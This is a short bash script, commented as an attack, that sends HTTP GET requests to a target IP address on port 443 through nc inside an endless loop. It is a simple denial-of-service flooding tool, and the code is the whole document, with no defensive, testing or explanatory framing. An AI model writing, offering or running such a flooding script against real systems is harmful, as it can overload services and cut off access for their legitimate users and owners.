#!/bin/bash

# Target IP and port to attack
TARGET_IP="192.168.0.1"
TARGET_PORT=443

# Function to send packets
send_packet() {
    echo -en "GET / HTTP/1.1\r\nHost: $TARGET_IP\r\nConnection: Keep-Alive\r\n\r\n" | nc -w 0 $TARGET_IP $TARGET_PORT
}

# Infinitely sending packets
while true; do
    send_packet
done

